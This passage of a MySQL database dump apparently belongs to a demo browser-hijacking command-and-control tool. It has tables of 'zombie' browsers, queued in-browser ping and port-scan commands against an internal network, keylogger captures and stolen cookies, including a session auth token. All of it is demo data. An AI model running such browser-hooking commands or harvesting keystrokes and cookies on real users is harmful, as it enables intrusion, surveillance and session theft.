18:01:19'),('1b7cb47b4dbdff971974793deaba8d0a','gAJ9cQEoVRJfYXV0aF91c2VyX2JhY2tlbmRxAlUpZGphbmdvLmNvbnRyaWIuYXV0aC5iYWNrZW5k\ncy5Nb2RlbEJhY2tlbmRxA1UNX2F1dGhfdXNlcl9pZHEEigEBdS5iMzM4MWMyYWI3N2Y1OWZkNWE4\nY2E5YTI3ZTQ4ZjQ1OA==\n','2011-11-15 18:41:26'),('0f8bef590409f4c570d5bf10d55c626b','gAJ9cQEoVRJfYXV0aF91c2VyX2JhY2tlbmRxAlUpZGphbmdvLmNvbnRyaWIuYXV0aC5iYWNrZW5k\ncy5Nb2RlbEJhY2tlbmRxA1UNX2F1dGhfdXNlcl9pZHEEigEBdS5iMzM4MWMyYWI3N2Y1OWZkNWE4\nY2E5YTI3ZTQ4ZjQ1OA==\n','2011-11-21 18:02:13'),('0f2b2c00bebdaacdf0944ed6e9843bfd','gAJ9cQFVCnRlc3Rjb29raWVxAlUGd29ya2VkcQNzLjA3M2VlZWRjNjVlYjJiYTc5Mzg1YmVhZDZl\nN2FiN2E1\n','2011-11-30 10:52:43'),('b6d8ec9625cff7dfcd481ba635e46e31','gAJ9cQEoVRJfYXV0aF91c2VyX2JhY2tlbmRxAlUpZGphbmdvLmNvbnRyaWIuYXV0aC5iYWNrZW5k\ncy5Nb2RlbEJhY2tlbmRxA1UNX2F1dGhfdXNlcl9pZHEEigEBdS5iMzM4MWMyYWI3N2Y1OWZkNWE4\nY2E5YTI3ZTQ4ZjQ1OA==\n','2011-11-30 13:21:46'),('0f7d99b2387586d34480406d11eac3ce','gAJ9cQFVCnRlc3Rjb29raWVxAlUGd29ya2VkcQNzLjA3M2VlZWRjNjVlYjJiYTc5Mzg1YmVhZDZl\nN2FiN2E1\n','2011-12-19 10:05:28'),('88d3acc9dbd281cafbaca569083ed40a','gAJ9cQEoVRJfYXV0aF91c2VyX2JhY2tlbmRxAlUpZGphbmdvLmNvbnRyaWIuYXV0aC5iYWNrZW5k\ncy5Nb2RlbEJhY2tlbmRxA1UNX2F1dGhfdXNlcl9pZHEEigEBdS5iMzM4MWMyYWI3N2Y1OWZkNWE4\nY2E5YTI3ZTQ4ZjQ1OA==\n','2011-12-05 09:58:05'),('13fd069ce8d861c710d0b00c4b88869c','gAJ9cQEoVRJfYXV0aF91c2VyX2JhY2tlbmRxAlUpZGphbmdvLmNvbnRyaWIuYXV0aC5iYWNrZW5k\ncy5Nb2RlbEJhY2tlbmRxA1UNX2F1dGhfdXNlcl9pZHEEigEBdS5iMzM4MWMyYWI3N2Y1OWZkNWE4\nY2E5YTI3ZTQ4ZjQ1OA==\n','2011-12-19 12:15:53'),('082e3933b5aea76fbe22adf5ee3c1d20','gAJ9cQEoVRJfYXV0aF91c2VyX2JhY2tlbmRxAlUpZGphbmdvLmNvbnRyaWIuYXV0aC5iYWNrZW5k\ncy5Nb2RlbEJhY2tlbmRxA1UNX2F1dGhfdXNlcl9pZHEEigEBdS5iMzM4MWMyYWI3N2Y1OWZkNWE4\nY2E5YTI3ZTQ4ZjQ1OA==\n','2011-12-16 16:59:46'),('b44159480697f6be791104d09548cb36','gAJ9cQEoVRJfYXV0aF91c2VyX2JhY2tlbmRxAlUpZGphbmdvLmNvbnRyaWIuYXV0aC5iYWNrZW5k\ncy5Nb2RlbEJhY2tlbmRxA1UNX2F1dGhfdXNlcl9pZHEEigEBdS5iMzM4MWMyYWI3N2Y1OWZkNWE4\nY2E5YTI3ZTQ4ZjQ1OA==\n','2011-12-19 12:17:56');
/*!40000 ALTER TABLE `django_session` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `django_site`
--

DROP TABLE IF EXISTS `django_site`;
SET @saved_cs_client     = @@character_set_client;
SET character_set_client = utf8;
CREATE TABLE `django_site` (
  `id` int(11) NOT NULL auto_increment,
  `domain` varchar(100) NOT NULL,
  `name` varchar(50) NOT NULL,
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
SET character_set_client = @saved_cs_client;

--
-- Dumping data for table `django_site`
--

LOCK TABLES `django_site` WRITE;
/*!40000 ALTER TABLE `django_site` DISABLE KEYS */;
INSERT INTO `django_site` VALUES (1,'example.com','example.com');
/*!40000 ALTER TABLE `django_site` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `zombies`
--

DROP TABLE IF EXISTS `zombies`;
SET @saved_cs_client     = @@character_set_client;
SET character_set_client = utf8;
CREATE TABLE `zombies` (
  `id` int(11) NOT NULL auto_increment,
  `uid` varchar(32) NOT NULL,
  `utmwg` varchar(32) NOT NULL,
  `group` varchar(100) NOT NULL,
  `os` varchar(30) NOT NULL,
  `browser` varchar(30) NOT NULL,
  `title` varchar(1000) NOT NULL,
  `user_agent` varchar(1000) NOT NULL,
  `referer` varchar(1000) NOT NULL,
  `location` varchar(1000) NOT NULL,
  `ip` varchar(15) NOT NULL,
  `cookie` varchar(5000) NOT NULL,
  `born_time` datetime NOT NULL,
  `up_time` datetime NOT NULL,
  `status` int(11) NOT NULL,
  `desc` varchar(500) NOT NULL,
  `local_time` varchar(100) NOT NULL,
  `screen` varchar(50) NOT NULL,
  `cpu_cores` varchar(10) NOT NULL,
  `memory` varchar(10) NOT NULL,
  PRIMARY KEY  (`id`),
  UNIQUE KEY `uid` (`uid`),
  UNIQUE KEY `utmwg` (`utmwg`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
SET character_set_client = @saved_cs_client;

--
-- Dumping data for table `zombies`
--

LOCK TABLES `zombies` WRITE;
/*!40000 ALTER TABLE `zombies` DISABLE KEYS */;
INSERT INTO `zombies` VALUES (1,'8f370e8f16a97208d23b85a5bffdee6f','759877852326490.1','www.foo.com','windows','Maxthon 3','w2g demo','Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET CLR 1.1.4322; .NET4.0C; BOIE9;ZHCN; Maxthon/3.0)','','http://www.foo.com:8080/w2gdemo/','127.0.0.1','w2gdemo=1','2011-12-05 10:35:18','2011-12-05 12:19:53',1,'','‎2019‎年‎7‎月‎18‎日‎ ‎15‎:‎20‎:‎55','1920x1080','2','4');
/*!40000 ALTER TABLE `zombies` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `zombies_cmd`
--

DROP TABLE IF EXISTS `zombies_cmd`;
SET @saved_cs_client     = @@character_set_client;
SET character_set_client = utf8;
CREATE TABLE `zombies_cmd` (
  `id` int(11) NOT NULL auto_increment,
  `uid` varchar(32) NOT NULL,
  `group` varchar(30) NOT NULL,
  `cmd` longtext NOT NULL,
  `attack_time` datetime NOT NULL,
  `add_time` datetime NOT NULL,
  `status` int(11) NOT NULL,
  PRIMARY KEY  (`id`),
  KEY `zombies_cmd_51c63bce` (`uid`)
) ENGINE=MyISAM AUTO_INCREMENT=9 DEFAULT CHARSET=utf8;
SET character_set_client = @saved_cs_client;

--
-- Dumping data for table `zombies_cmd`
--

LOCK TABLES `zombies_cmd` WRITE;
/*!40000 ALTER TABLE `zombies_cmd` DISABLE KEYS */;
INSERT INTO `zombies_cmd` VALUES (1,'8f370e8f16a97208d23b85a5bffdee6f','www.foo.com','w2g.net.pingscan(\"192.168.1.1-254\",\"20000\",\"\");','2011-06-13 00:00:00','2011-12-05 11:59:12',1),(2,'8f370e8f16a97208d23b85a5bffdee6f','www.foo.com','w2g.net.portscan(\"192.168.1.1\",\"80\",\"1000\",\"\");','2011-06-13 00:00:00','2011-12-05 12:00:39',1),(3,'8f370e8f16a97208d23b85a5bffdee6f','www.foo.com','w2g.net.portscan(\"192.168.1.1\",\"8888\",\"1000\",\"\");','2011-06-13 00:00:00','2011-12-05 12:01:03',1),(4,'8f370e8f16a97208d23b85a5bffdee6f','www.foo.com','w2g.net.portscan(\"192.168.1.1\",\"22\",\"1000\",\"\");','2011-06-13 00:00:00','2011-12-05 12:01:49',1),(5,'8f370e8f16a97208d23b85a5bffdee6f','www.foo.com','w2g.net.portscan(\"192.168.1.1\",\"23\",\"1000\",\"\");','2011-06-13 00:00:00','2011-12-05 12:02:16',1),(6,'8f370e8f16a97208d23b85a5bffdee6f','www.foo.com','w2g.net.portscan(\"192.168.1.1\",\"89\",\"1000\",\"\");','2011-06-13 00:00:00','2011-12-05 12:02:56',1),(7,'8f370e8f16a97208d23b85a5bffdee6f','www.foo.com','w2g.net.portscan(\"192.168.1.1\",\"3389\",\"1000\",\"\");','2011-06-13 00:00:00','2011-12-05 12:03:02',1),(8,'8f370e8f16a97208d23b85a5bffdee6f','www.foo.com','w2g.net.portscan(\"192.168.1.1\",\"22\",\"1000\",\"\");','2011-06-13 00:00:00','2011-12-05 12:03:30',1);
/*!40000 ALTER TABLE `zombies_cmd` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `zombies_detail`
--

DROP TABLE IF EXISTS `zombies_detail`;
SET @saved_cs_client     = @@character_set_client;
SET character_set_client = utf8;
CREATE TABLE `zombies_detail` (
  `id` int(11) NOT NULL auto_increment,
  `uid` varchar(32) NOT NULL,
  `group` varchar(30) NOT NULL,
  `info` longtext NOT NULL,
  `type` varchar(30) NOT NULL,
  `time` datetime NOT NULL,
  PRIMARY KEY  (`id`),
  KEY `zombies_detail_51c63bce` (`uid`),
  KEY `zombies_detail_3a04cc98` (`time`)
) ENGINE=MyISAM AUTO_INCREMENT=13 DEFAULT CHARSET=utf8;
SET character_set_client = @saved_cs_client;

--
-- Dumping data for table `zombies_detail`
--

LOCK TABLES `zombies_detail` WRITE;
/*!40000 ALTER TABLE `zombies_detail` DISABLE KEYS */;
INSERT INTO `zombies_detail` VALUES (1,'8f370e8f16a97208d23b85a5bffdee6f','www.foo.com','ÀÀ','keylog','2011-12-05 10:37:05'),(2,'8f370e8f16a97208d23b85a5bffdee6f','www.foo.com','test!','keylog','2011-12-05 10:52:56'),(3,'8f370e8f16a97208d23b85a5bffdee6f','www.foo.com','continue!!!!','keylog','2011-12-05 10:53:25'),(4,'8f370e8f16a97208d23b85a5bffdee6f','www.foo.com','keylogger-by-cos:)','keylog','2011-12-05 11:52:35'),(5,'8f370e8f16a97208d23b85a5bffdee6f','www.foo.com','192.168.1.1 live, 1099ms.','ping','2011-12-05 11:59:16'),(6,'8f370e8f16a97208d23b85a5bffdee6f','www.foo.com','192.168.1.1:80 close','port','2011-12-05 12:00:40'),(7,'8f370e8f16a97208d23b85a5bffdee6f','www.foo.com','192.168.1.1:8888 close','port','2011-12-05 12:01:04'),(8,'8f370e8f16a97208d23b85a5bffdee6f','www.foo.com','192.168.1.1:22 open','port','2011-12-05 12:01:51'),(9,'8f370e8f16a97208d23b85a5bffdee6f','www.foo.com','192.168.1.1:23 open','port','2011-12-05 12:02:18'),(10,'8f370e8f16a97208d23b85a5bffdee6f','www.foo.com','192.168.1.1:89 close','port','2011-12-05 12:02:57'),(11,'8f370e8f16a97208d23b85a5bffdee6f','www.foo.com','192.168.1.1:3389 close','port','2011-12-05 12:03:06'),(12,'8f370e8f16a97208d23b85a5bffdee6f','www.foo.com','192.168.1.1:22 close','port','2011-12-05 12:03:33');
/*!40000 ALTER TABLE `zombies_detail` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `zombies_shadow`
--

DROP TABLE IF EXISTS `zombies_shadow`;
SET @saved_cs_client     = @@character_set_client;
SET character_set_client = utf8;
CREATE TABLE `zombies_shadow` (
  `id` int(11) NOT NULL auto_increment,
  `uid` varchar(32) NOT NULL,
  `sid` varchar(32) NOT NULL,
  `group` varchar(100) NOT NULL,
  `browser` varchar(30) NOT NULL,
  `user_agent` varchar(1000) NOT NULL,
  `ip` varchar(15) NOT NULL,
  `cookie` varchar(5000) NOT NULL,
  `born_time` datetime NOT NULL,
  `up_time` datetime NOT NULL,
  PRIMARY KEY  (`id`),
  KEY `zombies_shadow_51c63bce` (`uid`),
  KEY `zombies_shadow_236a1d8` (`sid`)
) ENGINE=MyISAM AUTO_INCREMENT=6 DEFAULT CHARSET=utf8;
SET character_set_client = @saved_cs_client;

--
-- Dumping data for table `zombies_shadow`
--

LOCK TABLES `zombies_shadow` WRITE;
/*!40000 ALTER TABLE `zombies_shadow` DISABLE KEYS */;
INSERT INTO `zombies_shadow` VALUES (1,'8f370e8f16a97208d23b85a5bffdee6f','d2877bae7cb6a0a792006b0ce48bd06d','www.foo.com','Firefox 8','Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0.1) Gecko/20100101 Firefox/8.0.1','127.0.0.1','w2gdemo=1; __utmwg=759877852326490.1; uchome_loginuser=test; uchome_auth=df3aNbBef%2BPp81RDI5pel2l8WQVW3VMvqyUWuHB%2FfORdhpt0WrI4pmrFzt%2FPrCeGP1J4wbE1qPjV%2FNe3HEz5; popunder=yes; popundr=yes; setover18=1','2011-12-05 10:35:18','2011-12-05 12:18:32'),(2,'8f370e8f16a97208d23b85a5bffdee6f','688e702b9fb0d54bf98353e2655fcb77','www.foo.com','IE 7','Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET CLR 1.1.4322; .NET4.0C; BOIE9;ZHCN; SE 2.X MetaSr 1.0)','127.0.0.1','w2gdemo=1','2011-12-05 10:37:13','2011-12-05 10:37:20'),(3,'8f370e8f16a97208d23b85a5bffdee6f','8a65df78741afa36a3a3e7be8c78d284','www.foo.com','Chrome 6','Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.472.33 Safari/534.3 SE 2.X MetaSr 1.0','127.0.0.1','__utmwg=759877852326490.1; w2gdemo=1; uchome_loginuser=test','2011-12-05 10:37:24','2011-12-05 10:37:24'),(4,'8f370e8f16a97208d23b85a5bffdee6f','56d4bdfbc464426546d9b007448d6e7b','www.foo.com','Maxthon 3','Mozilla/5.0 (Windows; U; Windows NT 6.1; ) AppleWebKit/534.12 (KHTML, like Gecko) Maxthon/3.0 Safari/534.12','127.0.0.1','__utmwg=759877852326490.1; w2gdemo=1','2011-12-05 10:43:05','2011-12-05 12:19:02'),(5,'8f370e8f16a97208d23b85a5bffdee6f','d9c43b37e614a84288a909fa5465440a','www.foo.com','Maxthon 3','Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET CLR 1.1.4322; .NET4.0C; BOIE9;ZHCN; Maxthon/3.0)','127.0.0.1','w2gdemo=1','2011-12-05 10:43:38','2011-12-05 12:19:53');
/*!40000 ALTER TABLE `zombies_shadow` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2011-12-05  4:21:06
